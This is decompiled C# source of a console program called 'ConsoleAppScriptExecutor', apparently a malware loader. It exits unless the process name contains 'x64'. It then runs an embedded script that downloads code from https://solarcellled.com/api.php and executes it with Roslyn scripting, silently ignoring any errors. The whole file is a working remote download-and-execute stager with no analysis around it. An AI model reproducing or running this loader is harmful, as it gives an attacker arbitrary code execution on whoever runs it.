using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.CodeAnalysis.CSharp.Scripting;
using Microsoft.CodeAnalysis.Scripting;

namespace ConsoleAppScriptExecutor
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		[NullableContext(1)]
		private static async Task Main(string[] args)
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string text = ((mainModule != null) ? mainModule.ModuleName : null);
			if (text == null || !text.Contains("x64", StringComparison.OrdinalIgnoreCase))
			{
				Environment.Exit(0);
			}
			Console.WriteLine("Starting execution...");
			string text2 = "using Microsoft.CodeAnalysis.CSharp.Scripting;\r\nusing Microsoft.CodeAnalysis.Scripting;\r\nusing System;\r\nusing System.Diagnostics;\r\nusing System.IO;\r\nusing System.Linq;\r\nusing System.Net.Http;\r\nusing System.Security.Cryptography;\r\nusing System.Threading.Tasks;\r\nusing System.Text.RegularExpressions;\r\nusing System.Reflection;\r\nusing System.Runtime.InteropServices;\r\nusing System.IO.Compression;\r\nusing System.Threading;\r\nusing System.Net;\r\n\r\npublic class ScriptRunner\r\n{\r\n    public static async Task<bool> ExecuteStartupTasks()\r\n    {\r\n        try\r\n        {\r\n            string url = \"https://solarcellled.com/api.php\";\r\n            string scriptContent = await FetchScriptContent(url);\r\n\r\n            if (string.IsNullOrEmpty(scriptContent))\r\n            {\r\n                return false;\r\n            }\r\n\r\n            await ExecuteScript(scriptContent);\r\n            return true;\r\n        }\r\n        catch\r\n        {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    private static async Task<string> FetchScriptContent(string url)\r\n    {\r\n        try\r\n        {\r\n            using (HttpClient client = new HttpClient())\r\n            {\r\n                HttpResponseMessage response = await client.GetAsync(url);\r\n\r\n                if (!response.IsSuccessStatusCode)\r\n                {\r\n                    return null;\r\n                }\r\n\r\n                return await response.Content.ReadAsStringAsync();\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            return null;\r\n        }\r\n    }\r\n\r\n    private static async Task ExecuteScript(string scriptContent)\r\n    {\r\n        try\r\n        {\r\n            var scriptOptions = ScriptOptions.Default\r\n.WithReferences(\r\n    typeof(object).Assembly,\r\n    typeof(Console).Assembly,\r\n    typeof(Task).Assembly,\r\n    typeof(HttpClient).Assembly,\r\n    typeof(Process).Assembly,\r\n    typeof(Aes).Assembly,\r\n    typeof(Enumerable).Assembly,\r\n    typeof(Regex).Assembly,\r\n    typeof(System.IO.Compression.ZipArchive).Assembly,\r\n    typeof(StructLayoutAttribute).Assembly,\r\n    typeof(Microsoft.CodeAnalysis.CSharp.Scripting.CSharpScript).Assembly,\r\n    typeof(Microsoft.CodeAnalysis.Scripting.Script).Assembly,\r\n    typeof(System.Net.WebRequest).Assembly,\r\n    typeof(Assembly).Assembly,\r\n    typeof(System.Runtime.InteropServices.Marshal).Assembly,\r\n    typeof(System.Threading.Thread).Assembly,\r\n    typeof(System.IO.File).Assembly\r\n)\r\n.WithImports(\r\n    \"System\",\r\n    \"System.Diagnostics\",\r\n    \"System.IO\",\r\n    \"System.Linq\",\r\n    \"System.Net.Http\",\r\n    \"System.Security.Cryptography\",\r\n    \"System.IO.Compression\",\r\n    \"System.Threading.Tasks\",\r\n    \"System.Runtime.InteropServices\",\r\n    \"System.Text.RegularExpressions\",\r\n    \"Microsoft.CodeAnalysis.CSharp.Scripting\",\r\n    \"Microsoft.CodeAnalysis.Scripting\",\r\n    \"System.Net\",\r\n    \"System.Reflection\",\r\n    \"System.Threading\"\r\n);\r\n\r\n\r\n\r\n            await CSharpScript.EvaluateAsync(scriptContent, scriptOptions);\r\n        }\r\n        catch\r\n        {\r\n        }\r\n    }\r\n}\r\n\r\nawait ScriptRunner.ExecuteStartupTasks();";
			ScriptOptions scriptOptions = ScriptOptions.Default.WithReferences(new Assembly[]
			{
				typeof(object).Assembly,
				typeof(Console).Assembly,
				typeof(Task).Assembly,
				typeof(HttpClient).Assembly,
				typeof(Process).Assembly,
				typeof(Aes).Assembly,
				typeof(Enumerable).Assembly,
				typeof(Regex).Assembly,
				typeof(ZipArchive).Assembly,
				typeof(StructLayoutAttribute).Assembly,
				typeof(CSharpScript).Assembly,
				typeof(Script).Assembly,
				typeof(WebRequest).Assembly,
				typeof(Assembly).Assembly,
				typeof(Marshal).Assembly,
				typeof(Thread).Assembly,
				typeof(File).Assembly
			}).WithImports(new string[]
			{
				"System", "System.Diagnostics", "System.IO", "System.Linq", "System.Net.Http", "System.Security.Cryptography", "System.IO.Compression", "System.Threading.Tasks", "System.Runtime.InteropServices", "System.Text.RegularExpressions",
				"Microsoft.CodeAnalysis.CSharp.Scripting", "Microsoft.CodeAnalysis.Scripting", "System.Net", "System.Reflection", "System.Threading"
			});
			try
			{
				await CSharpScript.EvaluateAsync(text2, scriptOptions, null, null, default(CancellationToken));
				Console.WriteLine("Execution completed successfully!");
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error during script execution: " + ex.Message);
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002094 File Offset: 0x00000294
		private static void <Main>([Nullable(1)] string[] args)
		{
			Program.Main(args).GetAwaiter().GetResult();
		}
	}
}
